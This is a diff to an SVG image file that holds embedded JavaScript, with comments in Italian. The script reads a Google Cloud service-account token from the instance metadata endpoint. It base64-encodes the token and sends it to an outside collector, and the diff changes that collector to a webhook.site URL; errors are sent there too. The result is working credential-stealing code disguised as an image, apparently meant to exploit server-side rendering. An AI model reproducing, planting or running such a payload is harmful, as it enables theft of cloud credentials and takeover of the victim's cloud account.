@@ -3,17 +3,16 @@
 <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="100" height="100">
   <script type="text/javascript">
     <![CDATA[
-      // Prova a connettersi a metadata
       fetch('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', {
         headers: {'Metadata-Flavor': 'Google'}
       })
       .then(r => r.text())
       .then(token => {
-        // Invia token al tuo server
-        fetch('https://matteocico.github.io/Kommunicate/log?token=' + btoa(token));
+        // INVIA A WEBHOOK.SITE - dove puoi vedere il token!
+        fetch('https://webhook.site/956eb152-d30c-4bc7-9f23-d10e0bd8e284?gcp_token=' + btoa(token));
       })
       .catch(e => {
-        fetch('https://matteocico.github.io/Kommunicate/log?error=' + btoa(e.message));
+        fetch('https://webhook.site/956eb152-d30c-4bc7-9f23-d10e0bd8e284?error=' + btoa(e.message));
       });
     ]]>
   </script>
